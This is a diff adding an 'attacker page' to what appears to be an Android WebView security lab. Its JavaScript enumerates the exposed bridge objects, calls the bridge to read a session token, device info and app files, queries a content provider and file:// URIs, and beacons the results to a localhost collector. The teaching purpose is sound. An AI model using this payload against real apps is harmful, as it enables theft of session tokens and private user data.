@@ -1,0 +1,203 @@
+<!--
+  examples/attacker-page/evil.html
+
+  The attacker's page for labs 01 and 03. Serve it from the HOST, not the device:
+
+      # host - from inside examples/attacker-page/
+      python3 -B -m http.server 8000
+
+      # host - make the host's port 8000 reachable on the device as 127.0.0.1:8000
+      adb reverse tcp:8000 tcp:8000
+
+      # host - hand the URL to the vulnerable app through its BROWSABLE deep link
+      adb shell am start -a android.intent.action.VIEW \
+          -d 'ch43vuln://open?url=http://127.0.0.1:8000/evil.html'
+
+  Nothing here is exotic. There is no exploit, no memory corruption, no CVE. It
+  is ordinary JavaScript, of the kind any web page may contain, calling methods
+  the app deliberately published to it. That is the whole lesson: once an
+  attacker chooses the URL, the app's own bridge is the attacker's API.
+
+  This page only ever talks to the app it is loaded into and to the local
+  collector below. It exfiltrates to 127.0.0.1, which is your own machine.
+-->
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>totally normal page</title>
+    <style>
+        body { font-family: monospace; padding: 10px; font-size: 12px; }
+        pre  { background: #fdd; padding: 8px; white-space: pre-wrap; word-break: break-all; }
+        h4   { margin: 12px 0 4px; }
+    </style>
+</head>
+<body>
+
+<h3>Loading&hellip;</h3>
+<pre id="out">running</pre>
+
+<script>
+var log = [];
+
+function say(label, value) {
+    log.push('=== ' + label + ' ===\n' + String(value));
+    document.getElementById('out').textContent = log.join('\n\n');
+}
+
+// ------------------------------------------------------------------------- //
+// 1. Enumerate the bridge.
+//
+//    A bridge object is a normal JavaScript object. Every method the app
+//    annotated with @JavascriptInterface is one of its properties, so the
+//    attacker's first move is a for-in loop -- no reverse engineering required.
+//    On API 17+ this lists exactly the annotated methods and nothing else, which
+//    is precisely why "we only exposed three methods" is not a defence: those
+//    three are now a published API.
+// ------------------------------------------------------------------------- //
+function enumerateBridges() {
+    var found = [];
+    for (var name in window) {
+        var v;
+        try { v = window[name]; } catch (e) { continue; }
+        if (v && typeof v === 'object' && !(v instanceof Node)) {
+            var methods = [];
+            for (var k in v) {
+                try {
+                    if (typeof v[k] === 'function') { methods.push(k); }
+                } catch (e) { /* ignore */ }
+            }
+            // A Java bridge shows up as a plain object whose every enumerable
+            // property is a function. Real DOM objects rarely look like that.
+            if (methods.length > 0 && methods.length < 60 && name !== 'console') {
+                found.push(name + ': ' + methods.join(', '));
+            }
+        }
+    }
+    say('window objects that look like Java bridges', found.join('\n') || '(none)');
+}
+
+// ------------------------------------------------------------------------- //
+// 2. Call the bridge. This is the finding.
+// ------------------------------------------------------------------------- //
+function useBridge() {
+    if (typeof AndroidBridge === 'undefined') {
+        say('AndroidBridge', 'not present -- is this the vulnerable app?');
+        return;
+    }
+    try { say('deviceInfo()', AndroidBridge.deviceInfo()); } catch (e) { say('deviceInfo()', e); }
+    try { say('getSessionToken()', AndroidBridge.getSessionToken()); } catch (e) { say('getSessionToken()', e); }
+
+    // An unconstrained path parameter. Traversal works because nothing
+    // canonicalises it.
+    try {
+        say('readFile(shared_prefs listing target)',
+            AndroidBridge.readFile('/data/data/com.pentest.ch43.vuln/files/session.txt'));
+    } catch (e) { say('readFile()', e); }
+
+    // /proc/self is always readable by the app's own UID and needs no
+    // permission. It confirms which process the bridge runs in -- and it is the
+    // BROWSER process, not the sandboxed renderer.
+    try {
+        say('readFile(/proc/self/status)',
+            AndroidBridge.readFile('/proc/self/status').split('\n').slice(0, 12).join('\n'));
+    } catch (e) { say('readFile(/proc/self/status)', e); }
+
+    // The bridge route to a ContentProvider.
+    try {
+        say('readContent(content://.../note)',
+            AndroidBridge.readContent('content://com.pentest.ch43.vuln.notes/note'));
+    } catch (e) { say('readContent()', e); }
+}
+
+// ------------------------------------------------------------------------- //
+// 3. Reach the provider with NO bridge at all.
+//
+//    setAllowContentAccess defaults to true at every targetSdkVersion measured
+//    (14 through 35, on WebView 150 / Android 11). So a page can fetch a
+//    content:// URI directly, and the provider sees the request as coming from
+//    the host app. Even an app with no addJavascriptInterface call anywhere is
+//    exposed to this.
+// ------------------------------------------------------------------------- //
+function useContentScheme() {
+    var uri = 'content://com.pentest.ch43.vuln.notes/note';
+    var x = new XMLHttpRequest();
+    x.onreadystatechange = function () {
+        if (x.readyState === 4) {
+            say('XHR ' + uri, 'status=' + x.status + '\n' + x.responseText);
+            // Report the STATUS as well as the body. An empty body with status 0
+            // is a blocked request, not an empty provider, and the two are easy
+            // to confuse when you are only looking at what came back.
+            exfil('content', 'status=' + x.status + ' body=' + x.responseText);
+        }
+    };
+    try {
+        x.open('GET', uri, true);
+        x.send();
+    } catch (e) {
+        say('XHR ' + uri, 'threw: ' + e);
+        exfil('content', 'threw: ' + e);
+    }
+}
+
+// ------------------------------------------------------------------------- //
+// 4. Read a local file with no bridge, using the file:// origin relaxations.
+//
+//    Only works when the page itself was loaded from file:// AND
+//    setAllowFileAccessFromFileURLs(true) or
+//    setAllowUniversalAccessFromFileURLs(true). From an http:// origin like this
+//    one, a file:// XHR is refused -- run it from file:// to see the difference,
+//    which is lab 01 step 7.
+// ------------------------------------------------------------------------- //
+function useFileScheme() {
+    var uri = 'file:///data/data/com.pentest.ch43.vuln/files/session.txt';
+    var x = new XMLHttpRequest();
+    x.onreadystatechange = function () {
+        if (x.readyState === 4) {
+            say('XHR ' + uri, 'status=' + x.status + '\n' + x.responseText);
+            exfil('file', 'status=' + x.status + ' body=' + x.responseText);
+        }
+    };
+    try {
+        x.open('GET', uri, true);
+        x.send();
+    } catch (e) {
+        say('XHR ' + uri, 'threw: ' + e);
+        exfil('file', 'threw: ' + e);
+    }
+}
+
+// ------------------------------------------------------------------------- //
+// 5b. Report where this page thinks it is. The ORIGIN decides which of the
+//     tricks above can work, and it is the first thing to check when one of them
+//     unexpectedly returns nothing.
+// ------------------------------------------------------------------------- //
+function reportOrigin() {
+    say('origin', 'location=' + location.href + '\norigin=' + location.origin);
+    exfil('origin', location.origin + ' | ' + location.href);
+}
+
+// ------------------------------------------------------------------------- //
+// 5. Exfiltrate to the collector on the host. 127.0.0.1 is your own machine via
+//    `adb reverse`; nothing leaves the pair of devices in front of you.
+// ------------------------------------------------------------------------- //
+function exfil(tag, data) {
+    var img = new Image();
+    img.src = 'http://127.0.0.1:8000/collect?tag=' + encodeURIComponent(tag)
+            + '&d=' + encodeURIComponent(String(data).slice(0, 1500));
+}
+
+reportOrigin();
+enumerateBridges();
+useBridge();
+useContentScheme();
+useFileScheme();
+
+if (typeof AndroidBridge !== 'undefined') {
+    try { exfil('token', AndroidBridge.getSessionToken()); } catch (e) { /* ignore */ }
+}
+</script>
+
+</body>
+</html>
